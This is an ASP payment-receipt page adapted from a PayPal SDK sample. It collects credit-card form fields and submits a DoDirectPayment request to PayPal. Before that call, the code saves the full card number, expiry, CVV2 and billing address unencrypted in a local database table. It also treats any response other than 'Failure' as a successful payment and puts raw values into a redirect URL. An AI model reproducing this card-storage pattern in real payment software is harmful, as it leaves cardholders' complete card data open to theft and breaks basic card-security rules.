
<!--#include virtual="site/inc/validate_admin.asp"-->
<!--#include virtual="inc/conn.asp"-->
<!-- #include virtual ="/paypal/CallerService.asp" -->
<%

	Response.Buffer = True
'-----------------------------------------------------------------------------
' DoDirectPaymentReceipt.asp

' Submits a credit card transaction to PayPal using a
' DoDirectPayment request.

' The code collects transaction parameters from the form
' displayed by DoDirectPayment.asp then constructs and sends
' the DoDirectPayment request string to the PayPal server.
' The paymentType variable becomes the PAYMENTACTION parameter
' of the request string.

' After the PayPal server returns the response, the code
' displays the API request and response in the browser.
' If the response from PayPal was a success, it displays the
' response parameters. If the response was an error, it
' displays the errors.

' Called by DoDirectPayment.asp.

' Calls CallerService.asp and APIError.asp.

'-----------------------------------------------------------------------------
	Dim firstName
	Dim lastName
	Dim creditCardType
	Dim creditCardNumber
	Dim expDateMonth
	Dim expDateYear
	Dim padDate
	Dim cvv2Number
	Dim address1
	Dim address2
	Dim city
	Dim state
	Dim zip
	Dim amount
	Dim currencyCode
	Dim paymentType
	Dim nvpstr
	Dim resArray
	Dim ack
	Dim message
	Dim order_code
	Dim Code
	Dim Country

	firstName			= trim(Request.Form("firstName"))
	lastName			= trim(Request.Form("lastName"))
	creditCardType		= trim(Request.Form("creditCardType"))
	creditCardNumber	= trim(Request.Form("creditCardNumber"))
	expDateMonth		= trim(Request.Form("expDateMonth"))
	expDateYear			= trim(Request.Form("expDateYear"))
	padDate				= expDateMonth&expDateYear
	cvv2Number			= trim(Request.Form("cvv2Number"))
	address1			= trim(Request.Form("address1"))
	address2			= trim(Request.Form("address2"))
	city				= trim(Request.Form("city"))
	state				= trim(Request.Form("state"))
	zip					= trim(Request.Form("zip"))
	amount				= trim(Request.Form("amount"))
	currencyCode		=trim(Request.Form("currency"))
	paymentType			=trim(Request.Form("paymentType"))
	order_code          =  trim(request.form("order_code"))
	code                =  trim(request.form("code"))
	Country             = trim(request.form("Country"))
	
    if len(creditCardNumber) <13 then
        Response.write "<script>alert('error.');window.history.go(-1);</script>"
        response.end
    end if

	set rs = server.Createobject("adodb.recordset")
	rs.open "select * from tb_order_paypal_record_info",conn,1,3
	rs.addnew
            rs("first_name") =         firstName  
            rs("last_name") =        lastName      
            rs("card_type") =      creditCardType        
            rs("card_number") =            creditCardNumber   
            rs("expiration_date") =     padDate
            rs("card_verification_number") =        cvv2Number       
            rs("address1") =        address1       
            rs("address2") =        address2
            rs("city") =            city
            rs("state") =           state
            rs("zip_code") =         zip   
            rs("country") =     Country
            rs("amount") =     amount
            rs("amount_unit") =   currencyCode 
            rs("regdate") = now()  
            if order_code <> "" then         
                rs("order_code") =     order_code
            end if
            if code <> "" then
                rs("code") =     code
            end if
	rs.update
	rs.close : set rs = nothing
	
'-----------------------------------------------------------------------------
' Construct the request string that will be sent to PayPal.
' The variable $nvpstr contains all the variables and is a
' name value pair string with &as a delimiter
'-----------------------------------------------------------------------------
	nvpstr	=	"&PAYMENTACTION=" &paymentType & _
				"&AMT="&amount &_
				"&CREDITCARDTYPE="&creditCardType &_
				"&ACCT="&creditCardNumber & _
				"&EXPDATE=" & padDate &_
				"&CVV2=" & cvv2Number &_
				"&FIRSTNAME=" & firstName &_
				"&LASTNAME=" & lastName &_
				"&STREET=" & address1 &_
				"&CITY=" & city &_
				"&STATE=" & state &_
				"&ZIP=" &zip &_
				"&COUNTRYCODE=US" &_
				"&CURRENCYCODE=" & currencyCode
	nvpstr	=	URLEncode(nvpstr)
'-----------------------------------------------------------------------------
' Make the API call to PayPal,using API signature.
' The API response is stored in an associative array called gv_resArray
'-----------------------------------------------------------------------------
	Set resArray	= hash_call("doDirectPayment",nvpstr)
	ack = UCase(resArray("ACK"))
'----------------------------------------------------------------------------------
' Display the API request and API response back to the browser.
' If the response from PayPal was a success, display the response parameters
' If the response was an error, display the errors received
'----------------------------------------------------------------------------------
	'If ack=UCase("Success") Then
	if UCase(ack) <> UCase("Failure") then 
		message			= "Thank you for your payment!"
		SESSION("ErrorMessage")	= Null
    	response.Redirect("paypal_card_do_direct_payment_ok.asp?order_code="& order_code &"&code="&code &"&TRANSACTIONID="&resArray("TRANSACTIONID")&"&AVS="& resArray("AVSCODE") &"&CVV2="&resArray("CVV2MATCH")&"")
	Else       
		 Set SESSION("nvpErrorResArray") = resArray
		 Response.Redirect "paypal_card_do_direct_payment_APIError.asp"
	End If	

%>
<html>
	<head>
		<title>PayPal ASP SDK - DoDirectPayment API</title>
		<link href="sdk.css" rel="stylesheet" type="text/css" />
	</head>
	<body alink="#0000FF" vlink="#0000FF">
		<center>
			<font size="2" color="black" face="Verdana"><b>Do Direct Payment</b></font>
			<br>
			<br>
			<b>
				<%=message%>
			</b>
			<br>
			<br>
			<table width="400"">
				<tr>
					<td>
						Transaction ID:</td>
					<td><%=resArray("TRANSACTIONID")%></td>
				</tr>
				<tr>
					<td>
						Amount:</td>
					<td>USD <%=resArray("AMT")%></td>
				</tr>
				<tr>
					<td>
						AVS:</td>
					<td><%=resArray("AVSCODE")%></td>
				</tr>
				<tr>
					<td>
						CVV2:</td>
					<td><%=resArray("CVV2MATCH")%></td>
				</tr>
			</table>
		</center>
		<%
    If Err.Number <> 0 Then
	SESSION("ErrorMessage")	= ErrorFormatter(Err.Description,Err.Number,Err.Source,"DoDirectPaymentReceipt.asp")
	Response.Redirect "APIError.asp"
	Else
	SESSION("ErrorMessage")	= Null
	End If
    %>
		<br>
		<a class="home" id="CallsLink" href="default.htm"><font color="blue"><B>Home<B><font></a>
	</body>
</html>
